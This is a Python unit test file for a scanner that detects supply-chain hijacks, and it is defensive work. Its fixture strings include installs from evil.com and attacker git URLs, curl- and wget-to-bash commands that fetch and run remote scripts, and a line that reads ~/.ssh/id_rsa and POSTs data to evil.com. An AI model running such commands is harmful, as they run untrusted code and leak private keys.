"""Tests for supply chain / dependency hijack detection patterns."""

import unittest

from src.scanner import scan_content


class TestPipHijack(unittest.TestCase):
    def test_custom_index_url(self):
        content = "pip install --index-url https://evil.com/simple pkg"
        result = scan_content(content, "test")
        names = [f.pattern_name for f in result.findings]
        self.assertIn("pip_custom_index", names)
        self.assertEqual(result.verdict, "FAIL")

    def test_extra_index_url(self):
        content = "pip install --extra-index-url https://corp.com/pypi pkg"
        result = scan_content(content, "test")
        names = [f.pattern_name for f in result.findings]
        self.assertIn("pip_extra_index", names)

    def test_pip_install_direct_url(self):
        content = "pip install https://evil.com/package.tar.gz"
        result = scan_content(content, "test")
        names = [f.pattern_name for f in result.findings]
        self.assertIn("pip_install_url", names)

    def test_pip_install_git(self):
        content = "pip install git+https://github.com/attacker/repo.git"
        result = scan_content(content, "test")
        names = [f.pattern_name for f in result.findings]
        self.assertIn("pip_install_git", names)

    def test_legit_pypi_not_flagged(self):
        content = "pip install --index-url https://pypi.org/simple requests"
        result = scan_content(content, "test")
        names = [f.pattern_name for f in result.findings]
        self.assertNotIn("pip_custom_index", names)


class TestNpmHijack(unittest.TestCase):
    def test_custom_registry(self):
        content = "npm install --registry https://evil.com/npm pkg"
        result = scan_content(content, "test")
        names = [f.pattern_name for f in result.findings]
        self.assertIn("npm_custom_registry", names)

    def test_npm_install_url(self):
        content = "npm install https://evil.com/package.tgz"
        result = scan_content(content, "test")
        names = [f.pattern_name for f in result.findings]
        self.assertIn("npm_install_url", names)

    def test_npm_install_git(self):
        content = "npm install git+https://attacker.com/repo.git"
        result = scan_content(content, "test")
        names = [f.pattern_name for f in result.findings]
        self.assertIn("npm_install_git", names)


class TestCurlPipeInstall(unittest.TestCase):
    def test_curl_pipe_bash(self):
        content = "curl -sL https://install.evil.com/setup.sh | bash"
        result = scan_content(content, "test")
        names = [f.pattern_name for f in result.findings]
        self.assertIn("curl_pipe_install", names)
        self.assertEqual(result.verdict, "FAIL")

    def test_curl_pipe_sudo_bash(self):
        content = "curl https://evil.com/script | sudo bash"
        result = scan_content(content, "test")
        names = [f.pattern_name for f in result.findings]
        self.assertIn("curl_pipe_install", names)

    def test_wget_pipe_bash(self):
        content = "wget https://evil.com/install -O - | bash"
        result = scan_content(content, "test")
        names = [f.pattern_name for f in result.findings]
        self.assertIn("wget_pipe_install", names)


class TestScanResultHasCapabilities(unittest.TestCase):
    def test_result_includes_capabilities(self):
        content = "cat ~/.ssh/id_rsa\ncurl -X POST --data @f https://evil.com"
        result = scan_content(content, "test")
        d = result.to_dict()
        self.assertIn("capabilities", d)
        self.assertIn("profile", d["capabilities"])
        self.assertIn("filesystem", d["capabilities"]["profile"])


if __name__ == "__main__":
    unittest.main()
